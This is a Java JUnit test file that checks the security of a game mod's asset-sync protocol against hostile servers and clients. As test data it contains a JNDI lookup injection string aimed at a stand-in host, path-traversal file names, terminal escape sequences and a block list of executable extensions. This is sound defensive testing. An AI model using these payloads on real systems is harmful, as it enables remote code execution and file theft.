package com.sandymandy.strut.assetsync;

import com.sandymandy.strut.assetsync.protocol.AssetSyncMessage.Chunk;
import com.sandymandy.strut.assetsync.protocol.AssetSyncMessage.ManifestPage;
import com.sandymandy.strut.assetsync.protocol.AssetSyncMessage.WantPage;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;
import com.sandymandy.strut.assetsync.client.ClientAssetSession;
import com.sandymandy.strut.assetsync.protocol.AssetManifest;
import com.sandymandy.strut.assetsync.protocol.AssetPath;
import com.sandymandy.strut.assetsync.protocol.AssetSyncException;
import com.sandymandy.strut.assetsync.protocol.AssetSyncMessage;
import com.sandymandy.strut.assetsync.protocol.ManifestEntry;
import com.sandymandy.strut.assetsync.protocol.SyncLimits;
import com.sandymandy.strut.assetsync.protocol.SyncResult;
import com.sandymandy.strut.assetsync.server.ServerAssetSession;

/**
 * A hostile server, and a hostile client. The goal is that nothing a peer sends can write
 * outside the cache, name a file the cache did not verify, put anything but data on disk, or exhaust memory
 * <p>
 * There is no code path from this module to code execution: nothing received is ever loaded as a class, run as a
 * script or handed to a shell, the cache holds files named only by hash (no extension, so nothing is executable by
 * name), and a file's type is restricted to data formats. What remains is the same exposure as a vanilla server resource
 * pack - the game's own PNG and OGG decoders - which these tests cannot cover
 */
class AssetSyncSecurityTest {
	@TempDir
	Path dir;

	private long filesUnder(Path root) throws IOException {
		if (!Files.exists(root))
			return 0;

		try (Stream<Path> walk = Files.walk(root)) {
			return walk.filter(Files::isRegularFile).count();
		}
	}

	@Test
	@DisplayName("code and script file types can never be synced, however they are spelled")
	void noExecutableTypes() {
		for (String name : List.of("a.class", "a.jar", "a.zip", "a.exe", "a.dll", "a.so", "a.bat", "a.cmd", "a.ps1", "a.sh", "a.js", "a.py",
				"a.lua", "a.groovy", "a.java", "a.jsp", "a.fsh", "a.vsh", "a.glsl", "a.accesswidener", "a.mixins.json.exe", "a.png.js", "a.JAR",
				"a.PNG", "a.png ", "a.png\0.exe", "a.png/", "a.png."))
			assertFalse(AssetPath.isValid("ns/" + name), name);
	}

	@Test
	@DisplayName("vanilla, realms and loader namespaces are reserved and cannot be written to")
	void reservedNamespaces() {
		for (String namespace : AssetPath.RESERVED_NAMESPACES)
			assertNotNull(AssetPath.rejection(namespace + "/textures/gui/title.png"), namespace);

		assertNull(AssetPath.rejection("minecraftish/x.png"), "only the exact reserved names");
		assertNull(AssetPath.rejection("mymod/textures/gui/title.png"));
	}

	@Test
	@DisplayName("text from the network is made log-safe: length-limited, and nothing but path characters survives")
	void describeIsLogSafe() {
		String attack = "${jndi:ldap://evil.example/a}\n\u001b[2Jfake log line";
		String safe = AssetPath.describe(attack);

		assertFalse(safe.contains("$"));
		assertFalse(safe.contains("{"));
		assertFalse(safe.contains(":"));
		assertFalse(safe.contains("\n"));
		assertFalse(safe.contains("\u001b"));
		assertTrue(AssetPath.describe("a".repeat(500)).length() <= 67);
		assertEquals("mymod/geo/eve.strutmodel", AssetPath.describe("mymod/geo/eve.strutmodel"));
	}

	@Test
	@DisplayName("no error message ever echoes an attacker's raw text")
	void errorsDoNotEchoRawText() {
		String attack = "${jndi:ldap://evil.example/a}";

		AssetSyncException badPath = assertThrows(AssetSyncException.class,
				() -> AssetManifest.of(List.of(new ManifestEntry("ns/" + attack + ".png", "a".repeat(64), 1)), SyncLimits.DEFAULT));
		AssetSyncException badNamespace = assertThrows(AssetSyncException.class,
				() -> AssetManifest.of(List.of(new ManifestEntry(attack + "/a.png", "a".repeat(64), 1)), SyncLimits.DEFAULT));

		assertFalse(badPath.getMessage().contains("${"));
		assertFalse(badNamespace.getMessage().contains("${"));
		assertFalse(String.valueOf(AssetPath.rejection("ns/" + attack + ".png")).contains("${"));
	}

	@Test
	@DisplayName("whatever paths a hostile manifest lists, nothing is written anywhere but the hash-named cache")
	void nothingEscapesTheCache() throws IOException {
		Path cacheDir = this.dir.resolve("cache");
		Path sentinelDir = this.dir.resolve("outside");

		Files.createDirectories(sentinelDir);

		for (String path : List.of("ns/../../outside/evil.png", "../outside/evil.png", "/outside/evil.png", "ns/..\\..\\outside\\evil.png", "C:/outside/evil.png")) {
			AssetSyncLink link = new AssetSyncLink(cacheDir);
			ClientAssetSession client = new ClientAssetSession(link.cache, ClientAssetSession.Config.DEFAULT, link.toServer::add);

			client.receive(new ManifestPage(AssetSyncMessage.PROTOCOL_VERSION, true, List.of(new ManifestEntry(path, "a".repeat(64), 5))));

			assertEquals(SyncResult.FAILED, client.result().orElseThrow(), path);
		}

		assertEquals(0, filesUnder(sentinelDir));
		assertEquals(0, filesUnder(cacheDir));
	}

	@Test
	@DisplayName("a chunk larger than the cap is refused however small the file claims to be")
	void oversizedChunk() {
		AssetSyncLink link = new AssetSyncLink(this.dir.resolve("a"));
		byte[] data = AssetSyncLink.filled(ClientAssetSession.MAX_CHUNK_BYTES + 1, 1);
		ClientAssetSession client = new ClientAssetSession(link.cache, ClientAssetSession.Config.DEFAULT, link.toServer::add);

		client.receive(new ManifestPage(AssetSyncMessage.PROTOCOL_VERSION, true, List.of(new ManifestEntry("mymod/a.png", AssetManifest.sha256Hex(data), data.length))));
		client.receive(new Chunk(AssetManifest.sha256Hex(data), 0, data));

		assertEquals(SyncResult.FAILED, client.result().orElseThrow());
		assertEquals(0, link.cache.totalBytes());
	}

	@Test
	@DisplayName("a server cannot make the client download more than the declared size of a file")
	void cannotExceedDeclaredSize() throws IOException {
		byte[] declared = AssetSyncLink.filled(100, 1);
		AssetSyncLink link = new AssetSyncLink(this.dir.resolve("a"));
		ClientAssetSession client = new ClientAssetSession(link.cache, ClientAssetSession.Config.DEFAULT, link.toServer::add);

		client.receive(new ManifestPage(AssetSyncMessage.PROTOCOL_VERSION, true, List.of(new ManifestEntry("mymod/a.png", AssetManifest.sha256Hex(declared), 100))));
		client.receive(new Chunk(AssetManifest.sha256Hex(declared), 0, AssetSyncLink.filled(4000, 1)));

		assertEquals(SyncResult.FAILED, client.result().orElseThrow());
		assertEquals(0, filesUnder(this.dir));
	}

	@Test
	@DisplayName("a cached file of the wrong length is deleted and fetched again, never served")
	void tornCacheFileIsRefetched() throws IOException {
		byte[] data = AssetSyncLink.filled(2000, 1);
		AssetSyncLink link = new AssetSyncLink(this.dir.resolve("a")).file("mymod/a.png", data);
		String hash = AssetManifest.sha256Hex(data);

		// Simulates a torn write: a file under the right name with the wrong length
		Files.createDirectories(link.cache.pathOf(hash).getParent());
		Files.write(link.cache.pathOf(hash), new byte[10]);

		link.open().runToLoaded();

		assertEquals(SyncResult.LOADED, link.server.result().orElseThrow());
		assertEquals(2000, link.chunkBytesSent(), "fetched again in full");
		assertArrayEquals(data, Files.readAllBytes(link.cache.pathOf(hash)));
	}

	@Test
	@DisplayName("cache files carry no extension: they are named by hash and nothing is executable by name")
	void cacheFilesHaveNoExtension() throws IOException {
		AssetSyncLink link = new AssetSyncLink(this.dir.resolve("a")).file("mymod/a.png", AssetSyncLink.filled(100, 1)).open();

		link.runToLoaded();

		try (Stream<Path> walk = Files.walk(this.dir.resolve("a"))) {
			assertTrue(walk.filter(Files::isRegularFile).allMatch(path -> !path.getFileName().toString().contains(".")));
		}
	}

	@Test
	@DisplayName("a client cannot ask the server for a file by path or by anything but a hash the manifest holds")
	void clientCannotNameFiles() {
		List<AssetSyncMessage> sent = new ArrayList<>();
		byte[] data = AssetSyncLink.filled(100, 1);
		AssetManifest manifest = AssetManifest.of(List.of(new ManifestEntry("mymod/a.png", AssetManifest.sha256Hex(data), 100)), SyncLimits.DEFAULT);

		for (String wanted : List.of("../../server.properties", "mymod/a.png", "f".repeat(64), "", "A".repeat(64))) {
			ServerAssetSession server = new ServerAssetSession(manifest, (entry, offset, length) -> data, ServerAssetSession.Config.DEFAULT, sent::add);

			server.start(0);
			server.receive(new WantPage(true, List.of(wanted)), 1);

			assertEquals(SyncResult.PROTOCOL_ERROR, server.result().orElseThrow(), wanted);
		}

		assertTrue(sent.stream().noneMatch(Chunk.class::isInstance), "no file content was ever sent");
	}

	@Test
	@DisplayName("a client that wants more hashes than the manifest has files is refused, so a want list cannot be used to stall the server")
	void wantFlood() {
		byte[] data = AssetSyncLink.filled(100, 1);
		AssetManifest manifest = AssetManifest.of(List.of(new ManifestEntry("mymod/a.png", AssetManifest.sha256Hex(data), 100)), SyncLimits.DEFAULT);
		ServerAssetSession server = new ServerAssetSession(manifest, (entry, offset, length) -> data, ServerAssetSession.Config.DEFAULT, message -> {});
		String hash = AssetManifest.sha256Hex(data);

		server.start(0);
		server.receive(new WantPage(false, List.of(hash)), 1);
		server.receive(new WantPage(false, List.of(hash)), 2);

		assertEquals(SyncResult.PROTOCOL_ERROR, server.result().orElseThrow());
	}

	@Test
	@DisplayName("a manifest listing more files than the cap is refused before any is processed")
	void manifestFlood() {
		AssetSyncLink link = new AssetSyncLink(this.dir.resolve("a"));
		ClientAssetSession client = new ClientAssetSession(link.cache, ClientAssetSession.Config.DEFAULT, link.toServer::add);
		List<ManifestEntry> page = new ArrayList<>();

		for (int i = 0; i < 20_000; i++)
			page.add(new ManifestEntry("ns/f" + i + ".png", "a".repeat(64), 1));

		for (int i = 0; i < 6 && client.result().isEmpty(); i++)
			client.receive(new ManifestPage(AssetSyncMessage.PROTOCOL_VERSION, false, page));

		assertEquals(SyncResult.FAILED, client.result().orElseThrow());
	}
}
